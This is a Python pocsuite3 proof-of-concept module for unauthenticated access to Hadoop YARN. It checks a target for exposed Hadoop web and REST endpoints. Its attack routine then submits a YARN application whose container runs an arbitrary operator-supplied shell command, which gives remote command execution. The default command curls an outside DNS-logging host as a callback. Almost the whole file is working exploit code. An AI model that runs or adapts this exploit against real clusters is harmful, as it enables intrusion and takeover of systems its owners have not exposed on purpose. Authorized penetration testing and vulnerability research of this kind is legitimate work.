# -*- coding:utf-8 -*-

from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, OptString, POC_CATEGORY
from urllib.parse import urlparse
import random

class DemoPOC(POCBase):
    vulID = ""
    version ='1'
    author = ["LMX"]
    vulDate = ""
    createDate = "2022-2-15"
    updateDate = "2022-2-15"
    references =[]
    name ="Hadoop 未授权访问"
    appPowerLink = ''
    appName = 'Hadoop'
    appVersion = ' '
    vulType = '未授权访问'
    desc = '''
    Hadoop 未授权访问漏洞
    '''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("curl http://test.dnslog.cn", description="curl dnslog")
        return o

    def _verify(self):
        result ={}
        pr = urlparse(self.url)
        try:
            url = 'http://' + pr.hostname + ':50070' + '/dfshealth.html'
            url_2 = 'http://' + pr.hostname + ':8088' + '/ws/v1/cluster/apps/new-application'
            headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
                    }            
            r = requests.get(url=url, headers=headers, timeout=5)
            rr = requests.post(url=url_2, headers=headers,timeout=5)
            if 'hadoop.css' in r.content.decode('utf-8') and 'application-id' in rr.content.decode('utf-8'):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        result ={}

        cmd = self.get_option("command")
        pr = urlparse(self.url)
        url = 'http://' + pr.hostname + ':8088' + '/ws/v1/cluster/apps/new-application'
        resp = requests.post(url=url)
        app_id = resp.json()['application-id']
        url_a = 'http://' + pr.hostname + ':8088' + '/ws/v1/cluster/apps'
        appnames = "hello"+str(random.randint(100,500))
        data = {
            'application-id': app_id,
            'application-name': appnames,
            'am-container-spec': {
                'commands': {
                    'command': 'RECOMMAND'.replace("RECOMMAND", cmd),
                },
            },
            'application-type': 'YARN',
        }

        try:
            response = requests.post(url=url_a, json=data)
            if (response and response.status_code == 202) or (response.status_code == 200 and 'OK' in response.text):
                result['Stdout'] = 'success'
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)
register_poc(DemoPOC)